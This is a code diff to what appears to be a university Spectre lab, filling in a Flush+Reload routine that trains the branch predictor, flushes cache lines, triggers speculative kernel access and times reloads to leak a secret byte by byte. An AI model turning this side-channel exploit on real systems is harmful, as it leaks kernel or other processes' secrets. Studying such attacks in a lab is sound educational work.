@@ -43,42 +43,41 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
+        // char leaked_byte;
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
+        char leaked_byte = '?';
         const uint64_t CACHE_HIT_THRESHOLD = 80;
-        int counts[256] = {0};
         const int max_attempts = 100;
+        int counts[256] = {0};
 
-        // Pre-fault shared memory to avoid TLB misses
+        // Step 0: TLB prefetch - resolve virtual to physical mappings
         for (int i = 0; i < 256; i++) {
             volatile char tmp = shared_memory[i * 4096];
         }
 
-        extern char *slow_ptr;
-
         for (int attempt = 0; attempt < max_attempts; attempt++) {
-            // Step 1: Train branch predictor
+            // Step 1: Branch predictor training
             for (int train = 0; train < 100; train++) {
-                call_kernel_part3(kernel_fd, shared_memory, 0);
+                call_kernel_part3(kernel_fd, shared_memory, 0);  // in-bounds access
             }
 
-            // Step 2: Flush slow_ptr to delay the false dependency chain
-            clflush(slow_ptr);
+            // Step 2: Flush a dependent input to delay condition resolution
+            clflush(&shared_memory[0]);
 
-            // Step 3: Delay to allow speculation a chance to run
+            // Step 3: Delay to allow speculative load to issue
             for (volatile int delay = 0; delay < 1000; delay++) {}
 
-            // Step 4: Flush all shared memory pages
+            // Step 4: Flush shared memory side-channel array
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * 4096]);
             }
 
-            // Step 5: Trigger speculative load through kernel
+            // Step 5: Trigger vulnerable speculative access
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            // Step 6: Reload + timing
+            // Step 6: Reload to detect cached index
             for (int i = 0; i < 256; i++) {
                 uint64_t time = time_access(&shared_memory[i * 4096]);
                 if (time < CACHE_HIT_THRESHOLD) {
@@ -87,12 +86,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
         }
 
-        // Step 7: Use majority vote
+        // Step 7: Take majority vote for leaked byte
         int best_guess = -1;
-        int best_count = 0;
+        int best_score = 0;
         for (int i = 0; i < 256; i++) {
-            if (counts[i] > best_count) {
-                best_count = counts[i];
+            if (counts[i] > best_score) {
+                best_score = counts[i];
                 best_guess = i;
             }
         }
